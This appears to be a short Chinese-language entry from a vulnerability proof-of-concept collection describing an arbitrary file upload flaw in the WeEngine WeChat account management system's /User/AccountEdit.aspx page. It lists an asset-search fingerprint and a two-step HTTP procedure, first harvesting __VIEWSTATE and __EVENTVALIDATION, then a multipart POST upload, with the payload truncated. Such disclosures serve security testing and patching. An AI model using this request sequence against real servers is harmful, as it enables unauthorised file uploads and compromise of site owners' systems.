# 微擎微信公众号管理系统系统AccountEdit存在任意文件上传漏洞

- **系统**：微擎微信公众号管理系统系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Widgets/WidgetCollection/"`
- **请求**：`GET /User/AccountEdit.aspx HTTP/1.1`

**请求体 / payload**
```
1、获取\_\_VIEWSTATE和\_\_EVENTVALIDATION值
Host:
Content-Length: 0

2、使用获取到的相应值上传文件
POST /User/AccountEdit.aspx HTTP/1.1
Host:
Content-Type: multipart/form-data;boundary=---------------------------786435874t38587593865736587346567358735687
-----------------------------786435874t38587593865736587346567358735687
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwUJNjcyMTYyMDMwD2QWAmYPZBYCAgcPZBYCAgEQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ8PFgIeBFRleHQFigI8TEkgY2xhc3M9VGFiSW4gaWQ9dGFiMSBzdHlsZT0nZGlzcGxheTonPjxBPuWfuuacrOS/oeaBrzwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjQgIHN0eWxl…（脚本共 1854 字，完整版见原文）
```

**其他**
- 微擎微信公众号管理系统系统AccountEdit存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 微擎微信公众号管理系统